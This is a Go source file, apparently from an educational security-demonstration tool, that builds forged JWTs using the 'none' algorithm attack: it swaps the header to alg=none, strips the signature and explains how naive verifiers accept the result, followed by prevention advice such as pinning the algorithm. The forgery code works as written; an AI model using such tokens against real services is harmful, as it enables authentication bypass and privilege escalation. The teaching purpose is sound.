package attacks

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// JWTNoneProcessor implements the JWT None Algorithm attack simulation
type JWTNoneProcessor struct {
	*BaseProcessor
	config *AttackConfig
}

// NewJWTNoneProcessor creates a new JWT None Algorithm attack processor
func NewJWTNoneProcessor() *JWTNoneProcessor {
	return &JWTNoneProcessor{
		BaseProcessor: NewBaseProcessor(),
		config:        NewAttackConfig(),
	}
}

// Configure configures the JWT None processor
func (p *JWTNoneProcessor) Configure(config map[string]interface{}) error {
	// JWT None attack doesn't require specific configuration
	return nil
}

// Process demonstrates the JWT None Algorithm attack
func (p *JWTNoneProcessor) Process(text string, operation string) (string, []string, error) {
	p.addIntroduction()

	// Parse the input as a JWT token or create a sample one
	var originalToken, maliciousToken string
	var err error

	if text == "" {
		// Empty input - create a sample JWT token for demonstration
		originalToken, err = p.createSampleToken()
		if err != nil {
			return "", nil, fmt.Errorf("failed to create sample token: %w", err)
		}
		maliciousToken, err = p.performNoneAttack(originalToken)
	} else if strings.Contains(text, ".") && len(strings.Split(text, ".")) == 3 {
		// Input looks like a JWT token - validate it
		parts := strings.Split(text, ".")
		if len(parts[0]) == 0 || len(parts[1]) == 0 {
			return "", nil, fmt.Errorf("invalid JWT format: empty header or payload")
		}
		originalToken = text
		maliciousToken, err = p.performNoneAttack(originalToken)
	} else {
		// Invalid input format
		return "", nil, fmt.Errorf("invalid input: expected JWT token or empty string")
	}

	if err != nil {
		return "", nil, fmt.Errorf("failed to perform none attack: %w", err)
	}

	// Analyze the attack
	p.analyzeAttack(originalToken, maliciousToken)

	// Add security implications
	p.addSecurityImplications()

	return maliciousToken, p.GetSteps(), nil
}

func (p *JWTNoneProcessor) addIntroduction() {
	p.AddStep("🔓 JWT None Algorithm Attack Demonstration")
	p.AddStep("=====================================")
	p.AddNote("A JWT's header names the algorithm used to sign it (e.g. \"alg\":\"HS256\").")
	p.AddNote("The 'none' algorithm means 'unsigned' — and some libraries trusted it.")
	p.AddSeparator()

	p.AddStep("📈 The flaw")
	p.AddStep("The attacker controls the token, INCLUDING its header. If the server decides how")
	p.AddStep("to verify by reading 'alg' FROM THE TOKEN, an attacker can set alg=none, drop the")
	p.AddStep("signature, and a naive verifier accepts it — no secret or key required.")
	p.AddNote("This is a trust-the-attacker's-input bug. See the JWT walkthrough (menu 10),")
	p.AddNote("which pins the expected algorithm and rejects any token whose alg differs.")
	p.AddSeparator()
}

func (p *JWTNoneProcessor) createSampleToken() (string, error) {
	// Create a sample JWT token with HS256 algorithm
	header := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
	}
	payload := map[string]interface{}{
		"sub":  "1234567890",
		"name": "John Doe",
		"role": "user",
		"iat":  1516239022,
		"exp":  1516242622,
	}

	// Encode header and payload
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	payloadB64 := base64.RawURLEncoding.EncodeToString(payloadJSON)

	// Create a fake signature (this would normally be HMAC-SHA256)
	fakeSignature := "fake_signature_for_demonstration"
	signatureB64 := base64.RawURLEncoding.EncodeToString([]byte(fakeSignature))

	token := fmt.Sprintf("%s.%s.%s", headerB64, payloadB64, signatureB64)

	p.AddStep("Sample JWT Token Created:")
	p.AddStep(fmt.Sprintf("Token: %s", token))
	p.AddSeparator()

	return token, nil
}

func (p *JWTNoneProcessor) performNoneAttack(originalToken string) (string, error) {
	// Split the original token
	parts := strings.Split(originalToken, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT token format")
	}

	// Decode the original header
	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("failed to decode header: %w", err)
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return "", fmt.Errorf("failed to parse header: %w", err)
	}

	p.AddStep("Original Token Analysis:")
	p.AddStep(fmt.Sprintf("Algorithm: %v", header["alg"]))
	p.AddStep(fmt.Sprintf("Type: %v", header["typ"]))
	p.AddStep(fmt.Sprintf("Header: %s", parts[0]))
	p.AddStep(fmt.Sprintf("Payload: %s", parts[1]))
	p.AddStep(fmt.Sprintf("Signature: %s", parts[2]))
	p.AddSeparator()

	// Create malicious header with "none" algorithm
	maliciousHeader := map[string]interface{}{
		"alg": "none",
		"typ": "JWT",
	}

	// Encode the malicious header
	maliciousHeaderJSON, err := json.Marshal(maliciousHeader)
	if err != nil {
		return "", fmt.Errorf("failed to marshal malicious header: %w", err)
	}

	maliciousHeaderB64 := base64.RawURLEncoding.EncodeToString(maliciousHeaderJSON)

	p.AddStep("Attack Process:")
	p.AddStep("1. Extract the original payload (claims)")
	p.AddStep("2. Create a new header with algorithm set to 'none'")
	p.AddStep("3. Remove the signature (set to empty string)")
	p.AddStep("4. Combine header.payload. (empty signature)")
	p.AddSeparator()

	// Create the malicious token: header.payload. (empty signature)
	maliciousToken := fmt.Sprintf("%s.%s.", maliciousHeaderB64, parts[1])

	p.AddStep("Malicious Token Created:")
	p.AddStep(fmt.Sprintf("New Algorithm: %s", maliciousHeader["alg"]))
	p.AddStep(fmt.Sprintf("New Header: %s", maliciousHeaderB64))
	p.AddStep(fmt.Sprintf("Payload: %s (unchanged)", parts[1]))
	p.AddStep("Signature: (empty)")
	p.AddStep(fmt.Sprintf("Malicious Token: %s", maliciousToken))
	p.AddSeparator()

	return maliciousToken, nil
}

func (p *JWTNoneProcessor) analyzeAttack(originalToken, maliciousToken string) {
	// Decode and analyze both tokens
	originalParts := strings.Split(originalToken, ".")
	maliciousParts := strings.Split(maliciousToken, ".")

	// Decode original header
	originalHeaderJSON, _ := base64.RawURLEncoding.DecodeString(originalParts[0])
	var originalHeader map[string]interface{}
	err := json.Unmarshal(originalHeaderJSON, &originalHeader)
	if err != nil {
		return
	}

	// Decode malicious header
	maliciousHeaderJSON, _ := base64.RawURLEncoding.DecodeString(maliciousParts[0])
	var maliciousHeader map[string]interface{}
	err = json.Unmarshal(maliciousHeaderJSON, &maliciousHeader)
	if err != nil {
		return
	}

	// Decode payloads
	originalPayloadJSON, _ := base64.RawURLEncoding.DecodeString(originalParts[1])
	maliciousPayloadJSON, _ := base64.RawURLEncoding.DecodeString(maliciousParts[1])

	var originalPayload, maliciousPayload map[string]interface{}
	err = json.Unmarshal(originalPayloadJSON, &originalPayload)
	if err != nil {
		return
	}
	err = json.Unmarshal(maliciousPayloadJSON, &maliciousPayload)
	if err != nil {
		return
	}

	p.AddStep("Attack Analysis:")
	p.AddStep("Original Token:")
	p.AddStep(fmt.Sprintf("  Algorithm: %v", originalHeader["alg"]))
	p.AddStep(fmt.Sprintf("  Has Signature: %t", len(originalParts[2]) > 0))
	p.AddStep(fmt.Sprintf("  Signature Length: %d bytes", len(originalParts[2])))

	p.AddStep("Malicious Token:")
	p.AddStep(fmt.Sprintf("  Algorithm: %v", maliciousHeader["alg"]))
	p.AddStep(fmt.Sprintf("  Has Signature: %t", len(maliciousParts[2]) > 0))
	p.AddStep(fmt.Sprintf("  Signature Length: %d bytes", len(maliciousParts[2])))

	p.AddStep("Payload Comparison:")
	p.AddStep("  Original and malicious payloads are identical")
	p.AddStep("  Claims remain unchanged:")
	for key, value := range originalPayload {
		p.AddStep(fmt.Sprintf("    %s: %v", key, value))
	}
	p.AddSeparator()

	// Show what happens during verification
	p.AddStep("Verification Process:")
	p.AddStep("1. JWT library reads the 'alg' field from header")
	p.AddStep("2. If 'alg' is 'none', library skips signature verification")
	p.AddStep("3. Token is considered valid without any cryptographic checks")
	p.AddStep("4. Attacker can modify any claims in the payload")
	p.AddSeparator()
}

func (p *JWTNoneProcessor) addSecurityImplications() {
	p.AddStep("⚠️ Security Implications:")
	p.AddStep("1. Complete bypass of signature verification")
	p.AddStep("2. Attacker can modify any claims in the token")
	p.AddStep("3. Role escalation attacks (change 'role' from 'user' to 'admin')")
	p.AddStep("4. Token forgery without knowing the secret key")
	p.AddStep("5. Session hijacking and privilege escalation")

	p.AddSeparator()
	p.AddStep("✅ Prevention & Solutions")
	p.AddStep("Core rule: the SERVER decides the algorithm, never the token.")
	p.AddStep("1. Pin the expected algorithm(s) and reject everything else — including 'none'.")
	p.AddStep("2. Verify against a specific key of the right type, so an alg the key can't")
	p.AddStep("   satisfy simply fails.")
	p.AddStep("Go (golang-jwt) — enforce the method explicitly:")
	p.AddStep("    jwt.Parse(tok, keyFn, jwt.WithValidMethods([]string{\"HS256\"}))")
	p.AddStep("    // and inside keyFn, assert the concrete *SigningMethodHMAC/RSA/etc.")
	p.AddStep("3. Beware algorithm-confusion too (RS256→HS256): pinning the algorithm blocks it.")
	p.AddStep("4. Keep secrets/keys strong, set short exp, and support revocation.")
	p.AddNote("The JWT walkthrough (menu 10) does exactly this: it compares the token's alg to")
	p.AddNote("the configured one and refuses to verify on mismatch.")
}
